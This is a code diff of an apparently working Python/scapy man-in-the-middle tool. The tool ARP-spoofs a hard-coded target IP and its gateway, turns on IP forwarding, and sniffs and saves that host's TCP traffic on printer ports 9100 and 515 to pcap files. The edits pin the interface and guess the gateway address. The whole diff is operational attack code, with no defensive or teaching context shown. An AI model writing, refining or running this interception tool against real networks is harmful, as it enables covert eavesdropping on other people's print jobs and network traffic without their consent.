@@ -9,11 +9,20 @@ import subprocess
 TARGET_IP = "10.72.61.252"
 PRINTER_PORTS = [9100, 515]
 BASE_OUTPUT_DIR = r'C:\Users\User\Downloads\Network_Project'
-INTERFACE = scapy.conf.iface.name
-GATEWAY_IP = scapy.conf.route.route("0.0.0.0")[2]
+
+TARGET_INDEX = 3
+INTERFACE_OBJ = scapy.conf.ifaces.dev_from_index(TARGET_INDEX)
+INTERFACE_NAME = INTERFACE_OBJ.name
+MY_MAC = INTERFACE_OBJ.mac
+
+ip_parts = INTERFACE_OBJ.ip.split('.')
+if len(ip_parts) == 4:
+    GATEWAY_IP = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.254"
+else:
+    GATEWAY_IP = scapy.conf.route.route("0.0.0.0")[2]
+
 
 stop_event = threading.Event()
-MY_MAC = scapy.get_if_hwaddr(INTERFACE)
 
 def resolve_mac(ip):
     try:
@@ -21,7 +30,8 @@ def resolve_mac(ip):
             scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), 
             timeout=2, 
             retry=2, 
-            verbose=False
+            verbose=False,
+            iface=INTERFACE_NAME
         )
         if ans:
             return ans[0][1].hwsrc
@@ -46,20 +56,22 @@ class NetworkSniffer:
         timestamp = time.strftime("%Y%m%d-%H%M%S")
         self.filename = os.path.join(self.output_path, f"capture_{timestamp}.pcap")
         self.writer = PcapWriter(self.filename, append=True, sync=True)
+        print(f"[*] Sniffer saving to: {self.filename}")
 
     def process_packet(self, pkt):
         if scapy.IP in pkt and scapy.TCP in pkt:
-            if pkt.src == MY_MAC:
+            if pkt[scapy.Ether].src == MY_MAC:
                 return
 
             tcp = pkt[scapy.TCP]
             if tcp.dport in PRINTER_PORTS or tcp.sport in PRINTER_PORTS:
                 if pkt[scapy.IP].src == self.target_ip or pkt[scapy.IP].dst == self.target_ip:
                     self.writer.write(pkt)
+                    print(f"[+] Data captured: {len(pkt)} bytes from {pkt[scapy.IP].src}")
 
     def start_sniffing(self):
         scapy.sniff(
-            iface=INTERFACE,
+            iface=INTERFACE_NAME,
             prn=self.process_packet,
             store=False,
             stop_filter=lambda x: stop_event.is_set()
@@ -79,8 +91,8 @@ def arp_spoof(target_ip, gateway_ip):
 
     while not stop_event.is_set():
         try:
-            scapy.sendp(p1, verbose=False)
-            scapy.sendp(p2, verbose=False)
+            scapy.sendp(p1, verbose=False, iface=INTERFACE_NAME)
+            scapy.sendp(p2, verbose=False, iface=INTERFACE_NAME)
             time.sleep(2)
         except Exception:
             break
@@ -92,9 +104,10 @@ def restore_network(target_ip, gateway_ip):
     if t_mac and g_mac:
         res_t = scapy.Ether(dst=t_mac)/scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=t_mac, hwsrc=g_mac)
         res_g = scapy.Ether(dst=g_mac)/scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=g_mac, hwsrc=t_mac)
-        scapy.sendp([res_t, res_g], count=5, verbose=False)
+        scapy.sendp([res_t, res_g], count=5, verbose=False, iface=INTERFACE_NAME)
 
 def main():
+    print(f"[*] Detected Gateway: {GATEWAY_IP}")
     toggle_ip_forwarding(enable=True)
     sniffer = NetworkSniffer(TARGET_IP)
     
